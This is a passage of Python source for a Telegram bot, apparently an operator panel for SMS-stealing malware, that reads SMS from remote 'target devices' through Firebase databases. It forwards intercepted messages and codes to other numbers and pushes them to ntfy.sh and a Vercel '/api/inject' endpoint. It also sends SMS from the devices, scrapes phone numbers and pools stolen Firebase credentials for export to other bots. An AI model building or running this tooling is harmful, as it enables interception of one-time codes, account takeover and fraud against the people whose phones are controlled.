                                        f"[+] SPEED       : {speed_sec}s ({fwd_ms}ms)\n"
                                        f"[+] FROM SENDER : {html.escape(sender).upper()}\n"
                                        f"[+] FORWARD TO  : {auto_target}\n"
                                        f"[+] DISPATCH    : {fwd_ms} MS\n"
                                        "──────────────────────────────────────\n"
                                        f"[+] BODY        : {html.escape(body[:100]).upper()}\n"
                                        "══════════════════════════════════════\n"
                                        "</code></pre>"
                                    )
                                    asyncio.create_task(bot.send_message(chat_id=user_id_to_notify, text=fwd_log_card, parse_mode=ParseMode.HTML))
                                except Exception as e_fwd:
                                    logger.error(f"Failed auto-forward for {user_id_to_notify}: {e_fwd}")

                            # --- STREAM 2: Vercel / ntfy Feed (License Key) ---
                            if license_key and re.search(r'[A-Za-z]', sender):
                                cfg["stats_real_sms"] = cfg.get("stats_real_sms", 0) + 1
                                
                                topic = 'pria_sms_' + re.sub(r'[^a-zA-Z0-9_-]', '', license_key)
                                payload = f"{sender}|{body}"
                                
                                t_inject_start = time.perf_counter()
                                ok = False
                                try:
                                    ntfy_url = f"https://ntfy.sh/{topic}"
                                    async with HTTP_SESSION.post(ntfy_url, data=payload, headers={'Content-Type': 'text/plain'}, timeout=3) as post_resp:
                                        ok = (post_resp.status == 200)
                                except Exception:
                                    ok = False
                                    
                                if not ok:
                                    try:
                                        vercel_url = "https://vercelsmsapi.vercel.app/api/inject"
                                        json_payload = {"sender": sender, "body": body, "licenseKey": license_key}
                                        async with HTTP_SESSION.post(vercel_url, json=json_payload, timeout=3) as post_resp:
                                            pass
                                    except Exception:
                                        pass

                                inject_duration_ms = round((time.perf_counter() - t_inject_start) * 1000)
                                if inject_duration_ms <= 0:
                                    inject_duration_ms = 4

                                inject_msg = (
                                    "<pre><code>"
                                    "╔════════════════════════════════════╗\n"
                                    "║           INJECT SUCCESS           ║\n"
                                    "╚════════════════════════════════════╝\n"
                                    f"[+] SENDER: {html.escape(sender).upper()}\n"
                                    f"[+] DATA  : {html.escape(body).upper()}\n"
                                    f"[+] TIME  : {inject_duration_ms}MS\n"
                                    "══════════════════════════════════════\n"
                                    "</code></pre>"
                                )
                                
                                log_to_dashboard(
                                    user_id=user_id_to_notify,
                                    action="SMS_INJECTED",
                                    details={"sender": sender, "body": body, "device": cfg.get("selected_device_id"), "latency_ms": inject_duration_ms}
                                )
                                
                                asyncio.create_task(bot.send_message(
                                    chat_id=user_id_to_notify, 
                                    text=inject_msg, 
                                    parse_mode=ParseMode.HTML
                                ))

                if new_messages_found:
                    user_id = cfg.get("user_id", cfg_path.stem.replace("user_", ""))
                    save_user_config(user_id, cfg)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Error in Firebase stream polling loop: {e}")

        await asyncio.sleep(0.1)

def parse_outgoing_sms_post(text: str) -> tuple[str, str] | None:
    if not text:
        return None
    
    t_clean = text.strip()
    to_number = ""
    body = ""

    # Strategy 1: Check for Pipe line format first ("<number> | <message>")
    for line in t_clean.splitlines():
        line_s = line.strip()
        if "|" in line_s:
            parts = line_s.split("|", 1)
            left = parts[0].strip()
            right = parts[1].strip()
            num_cand = clean_and_format_number(left)
            if num_cand and len(right) >= 2:
                if not re.match(r'^(?:message|body|to|one-tap copy|tap to copy)\s*$', right.lower()):
                    to_number = num_cand
                    body = right
                    break

    # Strategy 2: Header-based extraction (To: ... / Message: ... or Body: ...)
    if not to_number or not body:
        lines = [line.strip() for line in t_clean.splitlines()]
        extracted_to = ""
        extracted_body = ""
        
        i = 0
        while i < len(lines):
            line = lines[i]
            
            m_to = re.match(r'^(?:[^\w\s]+\s*)?(?:to|phone|target|number)(?:\s*\([^)]*\))?\s*:\s*(.*)$', line, re.IGNORECASE)
            if m_to:
                val = m_to.group(1).strip()
                if val:
                    extracted_to = val
                elif i + 1 < len(lines):
                    extracted_to = lines[i + 1]
                    i += 1

            m_msg = re.match(r'^(?:[^\w\s]+\s*)?(?:message|body|text|msg|sms)(?:\s*\([^)]*\))?\s*:\s*(.*)$', line, re.IGNORECASE)
            if m_msg:
                val = m_msg.group(1).strip()
                body_lines = []
                if val:
                    body_lines.append(val)
                
                j = i + 1
                while j < len(lines):
                    next_l = lines[j]
                    if (re.match(r'^(?:[^\w\s]+\s*)?(?:one-tap copy|tap to copy|to|outgoing sms|sms intercepted|━|═|-)', next_l, re.IGNORECASE)
                        or "|" in next_l):
                        break
                    if next_l:
                        body_lines.append(next_l)
                    j += 1
                extracted_body = "\n".join(body_lines).strip()
                i = j - 1

            i += 1

        if extracted_to and extracted_body:
            to_number = extracted_to
            body = extracted_body

    # Strategy 3: Fallback for "Outgoing SMS\n<number>\n<body>" format
    if not to_number or not body:
        lines = [line.strip() for line in t_clean.splitlines() if line.strip()]
        if len(lines) >= 3 and ("outgoing sms" in lines[0].lower() or "sms intercepted" in lines[0].lower()):
            num_cand = clean_and_format_number(lines[1])
            if num_cand:
                to_number = num_cand
                body = "\n".join(lines[2:]).strip()

    if to_number and body:
        clean_to = clean_and_format_number(to_number)
        return (clean_to or to_number.strip(), body.strip())

    return None

# -------------------------------------------------------------------
# Channel Post Handler for Outgoing SMS (Dual Format Support)
# -------------------------------------------------------------------
@router.channel_post()
async def handle_channel_post(message: Message):
    text = message.text or message.caption or ""
    parsed = parse_outgoing_sms_post(text)
    if parsed:
        to_number, body = parsed
        post_time = message.date.timestamp()
        now_time = time.time()
        queue_delay_ms = max(1, int(round((now_time - post_time) * 1000)))

        chat_id_str = str(message.chat.id)
        target_cfg = None
        
        # O(1) instantaneous memory lookup
        mapped_uid = CHANNEL_TO_USER_MAP.get(chat_id_str)
        if mapped_uid:
            cfg = load_user_config(mapped_uid)
            if cfg.get("channel_id") == chat_id_str and cfg.get("is_polling_active"):
                target_cfg = cfg

        if not target_cfg:
            for cfg_path in SESSIONS_DIR.glob("user_*.json"):
                try:
                    uid = cfg_path.stem.replace("user_", "")
                    cfg = load_user_config(uid)
                    if cfg.get("channel_id") == chat_id_str and cfg.get("is_polling_active"):
                        target_cfg = cfg
                        break
                except Exception:
                    continue
                
        if target_cfg:
            target_cfg["stats_spoof_injects"] = target_cfg.get("stats_spoof_injects", 0) + 1
            try:
                res_data, dispatch_ms = await send_sms_via_firebase(target_cfg, to_number, body)
                save_user_config(target_cfg.get("user_id"), target_cfg)
                
                total_pipeline_ms = queue_delay_ms + int(round(dispatch_ms))

                log_to_dashboard(
                    user_id=str(target_cfg.get("user_id")),
                    action="SMS_OUTGOING",
                    details={
                        "to": to_number,
                        "body": body,
                        "device": target_cfg.get("selected_device_id"),
                        "queue_delay_ms": queue_delay_ms,
                        "dispatch_ms": round(dispatch_ms, 1),
                        "total_ms": total_pipeline_ms
                    }
                )

                speed_sec = round(dispatch_ms / 1000.0, 2)
                total_sec = round(total_pipeline_ms / 1000.0, 2)

                feed_msg = (
                    "<pre><code>"
                    "╔════════════════════════════════════╗\n"
                    "║          TOKEN FORWARDED           ║\n"
                    "╚════════════════════════════════════╝\n"
                    f"[+] STATUS : SUCCESS ({speed_sec}s)\n"
                    f"[+] SPEED  : {speed_sec}s ({round(dispatch_ms, 1)}ms)\n"
                    f"[+] TO     : {to_number}\n"
                    f"[+] DATA   : {html.escape(body)}\n"
                    f"[+] FORMAT : OutgoingSMS-TapCopy\n"
                    f"[+] STATS  : fb {speed_sec}s | total {total_sec}s ({total_pipeline_ms}ms)\n"
                    "══════════════════════════════════════\n"
                    "</code></pre>"
                )
                asyncio.create_task(message.bot.send_message(chat_id=target_cfg.get("user_id"), text=feed_msg, parse_mode=ParseMode.HTML))
            except Exception as e:
                logger.error(f"Failed to send outgoing SMS via Firebase: {e}")

# -------------------------------------------------------------------
# Owner Administration Commands
# -------------------------------------------------------------------
@router.message(Command("approve"))
async def handle_approve_cmd(message: Message, command: CommandObject):
    if message.from_user.id not in OWNER_IDS:
        return
    args = (command.args or "").strip()
    if not args.isdigit():
        await message.answer("<b>Usage:</b> <code>/approve &lt;USER_ID&gt;</code>", parse_mode=ParseMode.HTML)
        return
    uid = int(args)
    users = load_approved_users()
    users.add(uid)
    save_approved_users(users)
    await message.answer(f"✅ User <code>{uid}</code> has been <b>approved</b>.", parse_mode=ParseMode.HTML)

@router.message(Command("unapprove"))
async def handle_unapprove_cmd(message: Message, command: CommandObject):
    if message.from_user.id not in OWNER_IDS:
        return
    args = (command.args or "").strip()
    if not args.isdigit():
        await message.answer("<b>Usage:</b> <code>/unapprove &lt;USER_ID&gt;</code>", parse_mode=ParseMode.HTML)
        return
    uid = int(args)
    users = load_approved_users()
    if uid in users:
        users.remove(uid)
        save_approved_users(users)
        await message.answer(f"❌ User <code>{uid}</code> has been <b>unapproved</b>.", parse_mode=ParseMode.HTML)
    else:
        await message.answer(f"⚠️ User <code>{uid}</code> is not in the approved list.", parse_mode=ParseMode.HTML)

def parse_firebases_from_text(text: str) -> list[tuple[str, str]]:
    results = []
    seen = set()

    def add_entry(u: str, a: str):
        cleaned = clean_firebase_entry(u, a)
        if cleaned:
            clean_u, clean_a = cleaned
            if (clean_u, clean_a) not in seen:
                seen.add((clean_u, clean_a))
                results.append((clean_u, clean_a))

    try:
        data = json.loads(text)
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    u = item.get("url") or item.get("firebase_url") or item.get("db") or ""
                    a = item.get("auth") or item.get("auth_key") or item.get("secret") or ""
                    if u:
                        add_entry(u, a)
                elif isinstance(item, str):
                    parsed = parse_profex_link(item)
                    if parsed:
                        add_entry(parsed[0], parsed[1])
            if results:
                return results
    except Exception:
        pass

    lines = text.splitlines()
    for line in lines:
        line = line.strip()
        if not line:
            continue
        parsed = parse_profex_link(line)
        if parsed:
            add_entry(parsed[0], parsed[1])
            continue
        if "|||" in line:
            parts = line.split("|||")
            if len(parts) >= 2:
                add_entry(parts[0], parts[1])
                continue
        m = re.search(r'(https?://[^\s|]+(?:firebaseio\.com|firebasedatabase\.app)[^\s|]*)', line)
        if m:
            u = m.group(1)
            # check if auth part follows
            remainder = line[m.end():].strip()
            a_cand = ""
            m_a = re.search(r'(?:\|\|\||\s+auth=\s*|\s+)?([a-zA-Z0-9_-]+)', remainder)
            if m_a:
                a_cand = m_a.group(1)
            add_entry(u, a_cand or u)

    return results

async def get_text_from_message_or_file(message: Message) -> str | None:
    doc = message.document
    if not doc and message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
    
    if doc:
        try:
            file_info = await message.bot.get_file(doc.file_id)
            temp_path = SESSIONS_DIR / f"import_tmp_{message.from_user.id}_{int(time.time())}.txt"
            await message.bot.download_file(file_info.file_path, destination=temp_path)
            try:
                content = temp_path.read_text(encoding="utf-8", errors="ignore")
                return content
            finally:
                temp_path.unlink(missing_ok=True)
        except Exception as e:
            logger.error(f"Error downloading document for import: {e}")
            return None

    if message.reply_to_message and message.reply_to_message.text:
        return message.reply_to_message.text

    return None

async def process_imported_firebases(message: Message, text_content: str, user_id: int):
    if user_id not in OWNER_IDS:
        await message.answer("<pre><code>[!] ACCESS DENIED: OWNER ONLY COMMAND.</code></pre>", parse_mode=ParseMode.HTML)
        return
    found_fbs = parse_firebases_from_text(text_content)
    if not found_fbs:
        await message.answer(
            "<pre><code>"
            "[!] ERROR: NO VALID FIREBASES FOUND.\n"
            "[+] FORMAT EXPECTED:\n"
            "    url|||auth PER LINE\n"
            "    OR PANEL LINKS (?s=...)"
            "</code></pre>",
            parse_mode=ParseMode.HTML
        )
        return

    global_fbs = get_global_firebases()
    existing_global = {f"{fb.get('url', '').rstrip('/')}|||{fb.get('auth', '')}" for fb in global_fbs}
    new_global_count = 0
    for u, a in found_fbs:
        u_clean = u.rstrip("/")
        k = f"{u_clean}|||{a}"
        if k not in existing_global:
            existing_global.add(k)
            global_fbs.append({"url": u_clean, "auth": a})
            new_global_count += 1

    try:
        GLOBAL_FB_PATH.write_text(json.dumps(global_fbs, indent=2), encoding="utf-8")
    except Exception as e:
        logger.error(f"Failed to write global firebases: {e}")

    cfg = load_user_config(user_id)
    user_saved = cfg.get("saved_firebases", [])
    if not isinstance(user_saved, list):
        user_saved = []
    existing_user = {f"{fb.get('url', '').rstrip('/')}|||{fb.get('auth', '')}" for fb in user_saved}
    for u, a in found_fbs:
        u_clean = u.rstrip("/")
        k = f"{u_clean}|||{a}"
        if k not in existing_user:
            existing_user.add(k)
            user_saved.append({"url": u_clean, "auth": a})

    cfg["saved_firebases"] = user_saved
    if not cfg.get("firebase_url") and found_fbs:
        cfg["firebase_url"] = found_fbs[0][0]
        cfg["auth_key"] = found_fbs[0][1]
    save_user_config(user_id, cfg)

    resp_text = (
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║          IMPORT SUCCESS            ║\n"
        "╚════════════════════════════════════╝\n"
        f"[+] PARSED : {len(found_fbs)} FIREBASES\n"
        f"[+] NEW    : {new_global_count} ADDED\n"
        f"[+] TOTAL  : {len(global_fbs)} IN GLOBAL POOL\n"
        "══════════════════════════════════════\n"
        "[+] USE /fy TO VIEW AND SELECT DEVICES\n"
        "</code></pre>"
    )
    await message.answer(resp_text, parse_mode=ParseMode.HTML)


@router.message(Command("export"))
async def handle_export_cmd(message: Message):
    if message.from_user.id not in OWNER_IDS:
        await message.answer("<pre><code>[!] ACCESS DENIED: OWNER ONLY COMMAND.</code></pre>", parse_mode=ParseMode.HTML)
        return
    
    all_fb = set()

    def add_export_candidate(u: Any, a: Any):
        cleaned = clean_firebase_entry(str(u or ""), str(a or ""))
        if cleaned:
            cu, ca = cleaned
            all_fb.add(f"{cu}|||{ca}")

    for cfg_path in SESSIONS_DIR.glob("user_*.json"):
        try:
            cfg = json.loads(cfg_path.read_text(encoding="utf-8"))
            if isinstance(cfg, dict):
                add_export_candidate(cfg.get("firebase_url"), cfg.get("auth_key"))
                for fb in cfg.get("saved_firebases", []):
                    add_export_candidate(fb.get("url"), fb.get("auth"))
        except Exception:
            continue

    for fb in get_global_firebases():
        add_export_candidate(fb.get("url"), fb.get("auth"))
            
    if not all_fb:
        await message.answer("<pre><code>[!] ERROR: NO SAVED FIREBASES FOUND TO EXPORT.</code></pre>", parse_mode=ParseMode.HTML)
        return

    # Clean, sorted list of firebases (alphabetical order)
    sorted_fbs = sorted(all_fb)
    export_path = SESSIONS_DIR / "exported_firebases.txt"
    export_path.write_text("\n".join(sorted_fbs) + "\n", encoding="utf-8")
    caption = (
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║          EXPORT SUCCESS            ║\n"
        "╚════════════════════════════════════╝\n"
        f"[+] TOTAL  : {len(sorted_fbs)} FIREBASES\n"
        "[+] STATUS : FILTERED & SORTED\n"
        "══════════════════════════════════════\n"
        "[+] USE: /import ON ANOTHER BOT\n"
        "</code></pre>"
    )
    await message.answer_document(FSInputFile(str(export_path)), caption=caption, parse_mode=ParseMode.HTML)

@router.message(Command("import"))
async def handle_import_cmd(message: Message, command: CommandObject, state: FSMContext):
    if message.from_user.id not in OWNER_IDS:
        await message.answer("<pre><code>[!] ACCESS DENIED: OWNER ONLY COMMAND.</code></pre>", parse_mode=ParseMode.HTML)
        return

    args = (command.args or "").strip()
    if args:
        await process_imported_firebases(message, args, message.from_user.id)
        return

    file_text = await get_text_from_message_or_file(message)
    if file_text:
        await process_imported_firebases(message, file_text, message.from_user.id)
        return

    await state.set_state(BotSetupStates.waiting_for_import_file)
    prompt_text = (
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║          IMPORT FIREBASES          ║\n"
        "╚════════════════════════════════════╝\n"
        "[+] SEND YOUR .TXT FILE NOW\n"
        "[+] OR PASTE FIREBASE CREDENTIALS\n"
        "──────────────────────────────────────\n"
        "[+] FORMAT: url|||auth PER LINE\n"
        "    OR PANEL LINKS (?s=...)\n"
        "══════════════════════════════════════\n"
        "</code></pre>"
    )
    await message.answer(prompt_text, parse_mode=ParseMode.HTML)

@router.message(StateFilter(BotSetupStates.waiting_for_import_file))
async def handle_import_file_state(message: Message, state: FSMContext):
    if message.from_user.id not in OWNER_IDS:
        await state.clear()
        return

    file_text = await get_text_from_message_or_file(message)
    if not file_text and message.text:
        file_text = message.text

    if file_text:
        await state.clear()
        await process_imported_firebases(message, file_text, message.from_user.id)
    else:
        await message.answer("<pre><code>[!] PLEASE SEND A VALID .TXT FILE OR TEXT.</code></pre>", parse_mode=ParseMode.HTML)

@router.message(F.document)
async def handle_direct_document_upload(message: Message, state: FSMContext):
    if message.from_user.id not in OWNER_IDS:
        return
    doc = message.document
    if doc and (str(doc.file_name).lower().endswith((".txt", ".json", ".log")) or doc.mime_type == "text/plain"):
        file_text = await get_text_from_message_or_file(message)
        if file_text:
            found = parse_firebases_from_text(file_text)
            if found:
                await state.clear()
                await process_imported_firebases(message, file_text, message.from_user.id)


@router.message(Command("clearfirebase"))
async def handle_clear_firebase_cmd(message: Message):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)
    cfg["saved_firebases"] = []
    cfg["firebase_url"] = ""
    cfg["auth_key"] = ""
    save_user_config(user_id, cfg)
    await message.answer("<pre><code>[+] SUCCESS: ALL DATABASES CLEARED.</code></pre>", parse_mode=ParseMode.HTML)

@router.message(Command("send"))
async def handle_send_cmd(message: Message, command: CommandObject):
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        await message.answer("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return

    text_to_send = (command.args or "").strip()
    if not text_to_send:
        await message.answer("❌ <b>Missing message!</b>\nUsage: <code>/send &lt;your message&gt;</code>", parse_mode=ParseMode.HTML)
        return

    success_count = 0
    fail_count = 0
    for cfg_path in SESSIONS_DIR.glob("user_*.json"):
        try:
            target_user_id = int(cfg_path.stem.replace("user_", ""))
            await message.bot.send_message(
                chat_id=target_user_id, 
                text=f"📢 <b>Broadcast Message:</b>\n\n{html.escape(text_to_send)}", 
                parse_mode=ParseMode.HTML
            )
            success_count += 1
            await asyncio.sleep(0.05)
        except Exception:
            fail_count += 1

    await message.answer(
        f"✅ <b>Broadcast Complete!</b>\n\n"
        f"👍 Success: {success_count}\n"
        f"👎 Failed: {fail_count}",
        parse_mode=ParseMode.HTML
    )

# -------------------------------------------------------------------
# Main Application Entry Point
# -------------------------------------------------------------------
async def main():
    global HTTP_SESSION

    if not BOT_TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN missing in .env file! Exiting.")
        sys.exit(1)

    connector = aiohttp.TCPConnector(
        ssl=False,
        limit=100,
        limit_per_host=20,
        keepalive_timeout=60,
        enable_cleanup_closed=True
    )
    HTTP_SESSION = aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=4, connect=1.5)
    )

    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    
    await bot.set_my_commands([
        BotCommand(command="start", description="Main menu and setup guide"),
        BotCommand(command="status", description="Check your configuration status"),
        BotCommand(command="setfirebase", description="Link Firebase URL"),
        BotCommand(command="fy", description="Select Target Device & SIM"),
        BotCommand(command="forward", description="Auto Send / Forward SMS with logs"),
        BotCommand(command="autoforward", description="Auto-forward incoming SMS to number"),
        BotCommand(command="find", description="Find & Scrape all phone numbers"),
        BotCommand(command="findonline", description="Find numbers from Online devices"),
        BotCommand(command="findsms", description="Extract numbers from SMS messages"),
        BotCommand(command="key", description="Set Vercel Feed License Key"),
        BotCommand(command="addchannel", description="Set Channel ID for SMS"),
        BotCommand(command="startmonitor", description="Start Live SMS Stream"),
        BotCommand(command="stopmonitor", description="Pause SMS Stream"),
        BotCommand(command="send", description="[Owner] Broadcast a message to all users"),
    ])
    
    dp = Dispatcher()
    dp.include_router(router)

    asyncio.create_task(firebase_incoming_sms_loop(bot))

    logger.info("Jackson Auto Token Sender Telegram Bot Starting...")
    try:
        await dp.start_polling(bot)
    finally:
        if HTTP_SESSION:
            await HTTP_SESSION.close()

if __name__ == "__main__":
    asyncio.run(main())
